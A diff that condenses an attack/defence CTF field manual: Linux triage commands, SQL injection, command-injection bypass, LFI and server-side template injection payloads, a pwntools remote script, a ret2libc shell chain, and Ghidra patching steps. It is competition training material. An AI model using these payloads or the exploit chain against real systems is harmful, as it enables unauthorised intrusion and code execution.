@@ -1,107 +1,71 @@
-# 📖 24-Hour A/D CTF Offline Field Manual & Cheat Sheet
+# Offline Field Manual & Cheat Sheet
 
-> **CARRY THIS OFFLINE ON A USB DRIVE.**  
-> Under strict no-AI competition rules, this document serves as your team's instant technical memory during the 24-hour match.
-
----
-
-## 📑 Quick Navigation
-1. [Linux Incident Response & Triage](#1-linux-incident-response--triage)
-2. [Web Exploitation & Quick Payloads](#2-web-exploitation--quick-payloads)
-3. [Pwn & Binary Exploitation Reference](#3-pwn--binary-exploitation-reference)
-4. [GDB / Pwndbg / GEF Reference](#4-gdb--pwndbg--gef-reference)
-5. [Ghidra Binary Patching Step-by-Step](#5-ghidra-binary-patching-step-by-step)
+Quick technical reference for offline usage during competition.
 
 ---
 
-## 1. Linux Incident Response & Triage
+## 1. Linux Incident Response
 
-### Spotting Open Ports & Rogue Processes
 ```bash
-# Check all listening TCP/UDP ports and owning process
+# Check listening ports and process IDs
 ss -tulpn
 
-# Process tree with user and command line
+# Process tree with full command lines
 ps auxf
 
-# Look for recently modified files (last 10 minutes)
-find /var/www /home /opt -mmin -10 -type f 2>/dev/null
+# Files modified in the last 15 minutes
+find /var/www /home /opt -mmin -15 -type f 2>/dev/null
 
-# Inspect cronjobs (common place for persistence)
-crontab -l
-cat /etc/crontab
-ls -la /etc/cron.*
-```
-
-### Docker Operations
-```bash
-# View all running containers and port mappings
+# View running docker containers
 docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}"
 
-# Jump into container shell
-docker exec -it <container_name_or_id> /bin/sh
-docker exec -it <container_name_or_id> /bin/bash
-
-# View live container logs
-docker logs --tail 100 -f <container_name_or_id>
-
-# Restart container after patch
-docker restart <container_name_or_id>
+# Access container shell
+docker exec -it <container_id> /bin/bash
 ```
 
 ---
 
-## 2. Web Exploitation & Quick Payloads
+## 2. Web Exploitation Payloads
 
-### SQL Injection Quick Reference
+### SQL Injection
 
 #### MySQL / MariaDB
 ```sql
--- Union Testing
 ' UNION SELECT 1,2,3-- -
 ' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
 ' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='flags'-- -
-' UNION SELECT 1,group_concat(flag),3 FROM flags-- -
-
--- Authentication Bypass
+' UNION SELECT 1,flag,3 FROM flags ORDER BY id DESC LIMIT 1-- -
 admin' -- -
-admin' #
-' or 1=1-- -
+' OR 1=1-- -
 ```
 
 #### SQLite
 ```sql
--- Union & Schema extraction
 ' UNION SELECT 1,2,3--
 ' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--
-' UNION SELECT 1,flag,3 FROM flags--
+' UNION SELECT 1,flag,3 FROM flags ORDER BY rowid DESC LIMIT 1--
 ```
 
 #### PostgreSQL
 ```sql
 ' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema='public'--
 ' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='flags'--
-' UNION SELECT null,flag FROM flags--
+' UNION SELECT null,flag FROM flags ORDER BY 1 DESC LIMIT 1--
 ```
 
 ---
 
 ### Command Injection Bypasses
 
-#### Space Bypasses
 ```bash
+# Space bypasses
 cat$IFS$9/flag*
 cat<flag.txt
 {cat,/flag*}
-X=$'\x20';cat$X/flag*
-```
 
-#### Blacklisted Keyword Bypasses (`cat`, `flag`)
-```bash
+# Keyword bypasses
 c'a't /f*
 c"a"t /f*
-c\at /f\lag*
-more /f*
 head -n 50 /f*
 tail -n 50 /f*
 tac /f*
@@ -112,15 +76,9 @@ base64 /f* | base64 -d
 
 ### Local File Inclusion (LFI) & PHP Wrappers
 
-```bash
-# Read PHP source code encoded as Base64 (bypasses PHP execution)
+```text
 php://filter/convert.base64-encode/resource=index.php
 php://filter/convert.base64-encode/resource=config.php
-
-# RCE via data wrapper (if allow_url_include=On)
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pgo=&c=cat+/flag*
-
-# Path traversal traversal variations
 ....//....//....//....//flag.txt
 ..%2f..%2f..%2f..%2fflag.txt
 ```
@@ -131,112 +89,79 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pgo=&c=cat+/flag*
 
 #### Jinja2 (Python / Flask)
 ```jinja2
-{# Test Execution #}
 {{ 7 * 7 }}
-
-{# Read /flag #}
-{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}
 {{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}
-{{ lipsum.__globals__.__builtins__.__import__('os').popen('cat /flag*').read() }}
+{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}
 ```
 
 #### Twig (PHP)
 ```twig
 {{ 7 * 7 }}
 {{ ['cat /flag*']|filter('system') }}
-{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /flag*") }}
 ```
 
 ---
 
-## 3. Pwn & Binary Exploitation Reference
+## 3. Pwn & Binary Exploitation
 
-### Essential Pwntools Snippets
+### Basic Pwntools Template
 ```python
 from pwn import *
 
-context.arch = 'amd64'  # or 'i386'
-context.log_level = 'debug'
+context.arch = 'amd64'
+context.log_level = 'error'
 
-# Local or Remote switch
-if args.REMOTE:
-    io = remote('10.60.1.1', 9999)
-else:
-    io = process('./chall')
+io = remote('10.60.1.1', 9999, timeout=3)
+io.sendline(b"cat /flag*")
+print(io.recvall(timeout=2))
+io.close()
+```
 
-elf = ELF('./chall')
-# libc = ELF('./libc.so.6')
-
-# Cyclic Pattern generation & offset finding
-# cyclic(100) -> send to app
-# cyclic_find(0x6161616a) -> gives exact RIP offset
-
-io.sendline(b"payload")
-print(io.recvline())
-io.interactive()
+### Cyclic Pattern (Finding RIP Offset)
+```bash
+# In Pwndbg / GDB:
+cyclic 150
+# After crash with segfault at 0x6161616a:
+cyclic -l 0x6161616a
 ```
 
 ### Ret2libc Formula (x86_64)
 ```python
-# 1. Leak GOT address of a function (e.g. puts)
 rop = ROP(elf)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret = rop.find_gadget(['ret'])[0] # Stack alignment for Ubuntu 18+
+ret = rop.find_gadget(['ret'])[0]
 
-payload = b"A" * offset
-payload += p64(pop_rdi) + p64(elf.got['puts'])
-payload += p64(elf.plt['puts'])
-payload += p64(elf.symbols['main']) # Return to main to re-trigger
-
+# Leak GOT:
+payload = b"A" * offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
 io.sendline(payload)
 leak = u64(io.recvline().strip().ljust(8, b'\x00'))
 libc.address = leak - libc.symbols['puts']
 
-# 2. Spawn shell or cat flag
-payload2 = b"A" * offset
-payload2 += p64(ret) # 16-byte stack align
-payload2 += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
-payload2 += p64(libc.symbols['system'])
+# Shell:
+payload2 = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.symbols['system'])
 io.sendline(payload2)
 ```
 
 ---
 
-## 4. GDB / Pwndbg / GEF Reference
+## 4. GDB / Pwndbg Reference
 
 | Command | Action |
 | :--- | :--- |
-| `checksec` | Show binary mitigations (NX, Canary, PIE, RELRO). |
-| `cyclic 150` | Generate cyclic pattern. |
-| `cyclic -l 0x61616162` | Find buffer overflow offset after crash. |
-| `vmmap` | Display virtual memory layout and permissions. |
-| `telescope $rsp 20` | Inspect top 20 entries on the stack. |
-| `x/10gx $rsp` | Examine 10 giant words (hex) at stack pointer. |
-| `x/i $rip` | Disassemble current instruction. |
-| `search -s "FLAG"` | Search memory for flag string. |
-| `one_gadget libc.so.6` | (CLI tool) Find magic RCE offsets in libc. |
+| `checksec` | Display binary protections (NX, Canary, PIE, RELRO). |
+| `vmmap` | Display memory map and segment permissions. |
+| `telescope $rsp 20` | Examine top 20 stack entries. |
+| `x/10gx $rsp` | Dump 10 64-bit words at stack pointer in hex. |
+| `search -s "FLAG"` | Search memory space for flag string. |
+| `one_gadget libc.so.6` | Find one-gadget RCE addresses. |
 
 ---
 
-## 5. Ghidra Binary Patching Step-by-Step
+## 5. Ghidra Binary Patching
 
-1. **Open Ghidra** -> Create project -> Import challenge binary -> Run Auto-Analyze.
-2. **Locate Vulnerability** in Decompiler:
-   - Identify dangerous function call (e.g., `system("/bin/sh")` or `strcpy(dest, src)`).
-3. **Patch Assembly directly:**
-   - In the Listing view, click on the instruction.
-   - Press **`Ctrl + Shift + G`** (Patch Instruction).
-   - Change instruction:
-     - Replace dangerous call with **`NOP`** (`0x90`).
-     - Or replace `RET` (`0xC3`) right at the start of a backdoor function to exit immediately!
-4. **Export Patched Binary:**
-   - File -> **Export Program**
-   - Format: **Original File**
-   - Save as `chall_patched`.
-5. **Verify and Deploy:**
-   ```bash
-   chmod +x chall_patched
-   ./chall_patched
-   sudo cp chall_patched /opt/chall/chall
-   sudo systemctl restart chall || docker restart chall
-   ```
+1. Open binary in Ghidra -> Run Auto-Analyze.
+2. Select vulnerable instruction in Listing view.
+3. Press `Ctrl + Shift + G` (Patch Instruction).
+4. Replace dangerous `CALL` with `NOP` (`0x90`) or set function start to `RET` (`0xC3`).
+5. Export: `File -> Export Program -> Original File`.
+6. Replace live binary on server and restart service.
